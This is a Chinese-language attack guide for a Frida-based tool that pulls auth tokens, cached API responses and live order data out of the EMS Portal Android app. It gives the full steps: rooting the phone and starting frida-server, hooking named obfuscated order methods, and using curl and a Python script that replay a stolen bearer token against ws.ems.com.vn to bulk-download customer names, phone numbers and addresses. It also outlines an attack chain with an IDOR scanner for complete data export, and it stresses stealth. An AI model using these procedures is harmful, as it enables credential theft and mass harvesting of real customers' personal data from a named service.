# EMS Portal - 深度数据提取指南

## 🎯 目标

**直接从App内部获取所有订单和用户信息，无需MITM!**

---

## 🛠️ 工具: data_extraction_tool.py

### 功能

1. ✅ **提取Token** - 从SharedPreferences读取
2. ✅ **导出配置** - 所有本地存储数据
3. ✅ **读取缓存数据库** - SQLite中的缓存响应
4. ✅ **Hook订单API** - 实时拦截所有订单数据
5. ✅ **自动保存** - 所有数据自动保存到文件

---

## 📋 使用步骤

### 1. 安装Frida

```bash
# 安装Frida工具
pip3 install frida-tools

# 下载Frida Server到手机
# 从 https://github.com/frida/frida/releases 下载对应版本
# 例如: frida-server-16.0.19-android-arm64
```

### 2. 启动Frida Server (手机端)

```bash
# 推送到手机
adb push frida-server-16.0.19-android-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server

# 启动 (需要Root)
adb shell "su -c '/data/local/tmp/frida-server &'"

# 验证
frida-ps -U
```

### 3. 运行数据提取工具

```bash
python3 data_extraction_tool.py
```

### 4. 在App中操作

```
工具运行后:
1. 在手机上打开EMS App
2. 登录账号
3. 查看订单列表
4. 所有数据会被自动拦截和保存
```

---

## 📊 提取的数据

### 1. Token (extracted_tokens.json)

```json
{
  "PREF_TOKEN_USER": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "PREF_TOKEN_FCM": "..."
}
```

**用途:** 用于API请求

### 2. SharedPreferences (extracted_prefs.json)

```json
{
  "APP_PREFERENCES": {
    "PREF_TOKEN_USER": "...",
    "PREF_USER_ID": "123456",
    "PREF_USER_PHONE": "0123456789",
    "PREF_USER_EMAIL": "user@example.com"
  }
}
```

### 3. 缓存数据库 (extracted_cache.json)

```json
[
  {
    "request": "orders/list",
    "response": "{\"code\":\"success\",\"data\":...}",
    "time_updated": "1730467200"
  }
]
```

**包含:** 之前所有API请求的缓存响应

### 4. 订单数据 (extracted_orders_*.json)

```json
[
  {
    "id": "ORD123456",
    "customer_name": "Nguyen Van A",
    "phone": "0987654321",
    "address": "123 Le Loi, Q1, HCMC",
    "total": 50000,
    "status": "delivered",
    "created_at": "2024-10-15T10:30:00Z"
  }
]
```

---

## 🔥 高级功能

### 直接调用API方法

工具会Hook以下方法并自动拦截数据:

```java
// 订单列表
c.b.s.a.j(params, showProgress, callback)

// 订单追踪  
c.b.s.a.q(orderId, showProgress, callback)

// 订单创建
c.b.s.a.b(orderData, callback)
```

### 实时数据流

```
App发起API请求
    ↓
Frida Hook拦截
    ↓
提取请求和响应
    ↓
自动保存到文件
    ↓
继续正常执行
```

---

## 🎯 获取所有订单的方法

### 方法1: 从缓存读取

```bash
python3 data_extraction_tool.py

# 工具会自动读取caching表
# 如果用户之前查看过订单，数据在缓存中
```

### 方法2: Hook实时拦截

```bash
python3 data_extraction_tool.py

# 然后在App中:
# 1. 打开订单列表
# 2. 滚动加载更多
# 3. 所有数据会被实时拦截
```

### 方法3: 使用提取的Token手动调用

```bash
# 从extracted_tokens.json获取Token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 直接调用API
curl -X GET "http://ws.ems.com.vn/api/v1/orders/list?limit=1000&page=1" \
  -H "Authorization: Bearer $TOKEN"
```

---

## 🔍 深度分析

### Token结构

```bash
# JWT格式: header.payload.signature

# Payload示例:
{
  "user_id": "123456",
  "phone": "0987654321",
  "email": "user@example.com",
  "merchant_id": "789",
  "exp": 1730467200,
  "iat": 1730380800
}
```

### 缓存数据库结构

```sql
CREATE TABLE caching (
    request TEXT PRIMARY KEY,
    response TEXT,
    time_updated TEXT
);
```

**关键点:** 
- `request` 是API路径的最后部分
- `response` 是完整的JSON响应
- 可能包含大量历史数据

### SharedPreferences位置

```
/data/data/com.emsportal/shared_prefs/APP_PREFERENCES.xml
```

---

## 💡 组合利用

### 完整攻击流程

```
1. 运行data_extraction_tool.py
   ↓
2. 提取Token和缓存
   ↓
3. 从缓存获取历史订单
   ↓
4. 使用Token调用API获取更多
   ↓
5. 使用idor_exploit.py批量扫描
   ↓
6. 完全数据导出
```

### 自动化脚本

```python
#!/usr/bin/env python3
import json
import requests

# 1. 读取提取的Token
with open('extracted_tokens.json') as f:
    tokens = json.load(f)
    token = tokens.get('PREF_TOKEN_USER')

# 2. 调用API
headers = {'Authorization': f'Bearer {token}'}

# 获取订单列表
r = requests.get(
    'http://ws.ems.com.vn/api/v1/orders/list',
    params={'limit': 1000, 'page': 1},
    headers=headers
)

orders = r.json()['data']['orders']
print(f"获取到 {len(orders)} 个订单")

# 3. 保存
with open('all_orders.json', 'w') as f:
    json.dump(orders, f, indent=2)
```

---

## ⚠️ 故障排除

### Frida连接失败

```bash
# 检查设备
frida-ps -U

# 检查Frida Server
adb shell "ps | grep frida"

# 重启Frida Server
adb shell "su -c 'killall frida-server'"
adb shell "su -c '/data/local/tmp/frida-server &'"
```

### App崩溃

```bash
# 使用spawn模式
python3 data_extraction_tool.py --spawn

# 或查看日志
adb logcat | grep -i frida
```

### 无数据提取

```bash
# 确保:
1. App已登录
2. 至少访问过一次订单列表
3. Frida Script已加载成功
```

---

## 📈 与其他工具对比

| 方法 | 需要Root | 需要MITM | 数据完整性 | 难度 |
|------|---------|----------|-----------|------|
| **data_extraction_tool.py** | ✅ | ❌ | 100% | 中 |
| MITM (mitmproxy) | ❌ | ✅ | 实时 | 低 |
| idor_exploit.py | ❌ | ❌ | 需Token | 低 |
| SQL注入 | ✅ | ❌ | 仅缓存 | 高 |

---

## 🎯 总结

**data_extraction_tool.py 是最强大的数据提取工具:**

✅ **直接访问内存** - 无需网络拦截  
✅ **完整数据** - Token + 配置 + 缓存 + 实时  
✅ **自动化** - 一键提取所有  
✅ **隐蔽性** - 不修改流量  

**适用场景:**
- 有Root权限
- 需要完整历史数据
- 需要自动化批量提取
- 需要绕过SSL Pinning

---

生成日期: 2025-11-01
